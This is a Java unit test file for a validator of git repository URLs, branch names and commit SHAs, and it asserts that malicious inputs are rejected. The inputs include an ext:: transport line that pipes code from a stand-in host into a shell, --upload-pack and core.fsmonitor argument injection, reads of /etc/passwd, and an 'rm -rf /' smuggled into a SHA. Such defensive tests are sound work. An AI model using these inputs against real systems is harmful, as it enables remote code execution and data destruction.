package ai.gitoracle.core.security;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static ai.gitoracle.core.security.RepoRefValidator.InvalidRepoRefException;
import static ai.gitoracle.core.security.RepoRefValidator.validateBranch;
import static ai.gitoracle.core.security.RepoRefValidator.validateRepoUrl;
import static ai.gitoracle.core.security.RepoRefValidator.validateSha;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class RepoRefValidatorTest {

    // ─── repoUrl: legitimate values ──────────────────────────────────────────

    @Test
    void acceptsPlainHttpsGithubUrl() {
        assertThat(validateRepoUrl("https://github.com/bettercallok/git-oracle"))
            .isEqualTo("https://github.com/bettercallok/git-oracle");
    }

    @Test
    void acceptsHttpsGithubUrlWithDotGitSuffix() {
        assertThat(validateRepoUrl("https://github.com/bettercallok/git-oracle.git"))
            .isEqualTo("https://github.com/bettercallok/git-oracle.git");
    }

    @Test
    void acceptsCustomAllowedHost() {
        assertThat(validateRepoUrl("https://gitlab.example.com/foo/bar", java.util.List.of("gitlab.example.com")))
            .isEqualTo("https://gitlab.example.com/foo/bar");
    }

    // ─── repoUrl: attacks ─────────────────────────────────────────────────────

    @Test
    void rejectsExtTransportCommandInjection() {
        assertThatThrownBy(() -> validateRepoUrl("ext::sh -c 'curl evil.example/x|sh'"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsFdTransport() {
        assertThatThrownBy(() -> validateRepoUrl("fd::3"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsLeadingDashArgumentInjection() {
        assertThatThrownBy(() -> validateRepoUrl("--upload-pack=/bin/sh"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsFileScheme() {
        assertThatThrownBy(() -> validateRepoUrl("file:///etc/passwd"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsPlainHttp() {
        assertThatThrownBy(() -> validateRepoUrl("http://github.com/a/b"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsSshScheme() {
        assertThatThrownBy(() -> validateRepoUrl("ssh://git@github.com/a/b.git"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsHostNotOnAllowlist() {
        assertThatThrownBy(() -> validateRepoUrl("https://evil.example.com/a/b"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsUserinfoHostConfusion() {
        // host is actually evil.com; github.com is just userinfo
        assertThatThrownBy(() -> validateRepoUrl("https://github.com@evil.com/a/b"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsExplicitPort() {
        assertThatThrownBy(() -> validateRepoUrl("https://github.com:9999/a/b"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsQueryString() {
        assertThatThrownBy(() -> validateRepoUrl("https://github.com/a/b?x=1"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsExtraPathSegments() {
        assertThatThrownBy(() -> validateRepoUrl("https://github.com/a/b/c"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsBlankRepoUrl() {
        assertThatThrownBy(() -> validateRepoUrl(""))
            .isInstanceOf(InvalidRepoRefException.class);
        assertThatThrownBy(() -> validateRepoUrl(null))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsOversizedRepoUrl() {
        String huge = "https://github.com/a/" + "b".repeat(600);
        assertThatThrownBy(() -> validateRepoUrl(huge))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    @Test
    void rejectsControlCharactersInRepoUrl() {
        assertThatThrownBy(() -> validateRepoUrl("https://github.com/a/b\n--upload-pack=x"))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    // ─── branch: legitimate values ────────────────────────────────────────────

    @Test
    void acceptsSimpleBranchName() {
        assertThat(validateBranch("main")).isEqualTo("main");
    }

    @Test
    void acceptsBranchWithSlash() {
        assertThat(validateBranch("feature/add-thing")).isEqualTo("feature/add-thing");
    }

    @Test
    void nullAndBlankBranchMeanUseDefault() {
        assertThat(validateBranch(null)).isNull();
        assertThat(validateBranch("")).isNull();
        assertThat(validateBranch("   ")).isNull();
    }

    // ─── branch: attacks ──────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
        "--upload-pack=/bin/sh",
        "-u/bin/sh",
        "--config=core.fsmonitor=touch x",
        "../../etc/passwd",
        "a//b",
        "a@{1}",
        "refs/heads/x.lock",
        "trailing/",
    })
    void rejectsMaliciousOrInvalidBranchNames(String branch) {
        assertThatThrownBy(() -> validateBranch(branch))
            .isInstanceOf(InvalidRepoRefException.class);
    }

    // ─── sha ────────────────────────────────────────────────────────────────

    @Test
    void acceptsValidShaLengths() {
        assertThat(validateSha("abc1234")).isEqualTo("abc1234");
        assertThat(validateSha("0123456789abcdef0123456789abcdef01234567")).hasSize(40);
    }

    @Test
    void nullAndBlankShaAreAllowed() {
        assertThat(validateSha(null)).isNull();
        assertThat(validateSha("")).isNull();
    }

    @ParameterizedTest
    @ValueSource(strings = {"not-a-sha", "abc", "zzzzzzz", "abc1234; rm -rf /"})
    void rejectsInvalidSha(String sha) {
        assertThatThrownBy(() -> validateSha(sha))
            .isInstanceOf(InvalidRepoRefException.class);
    }
}
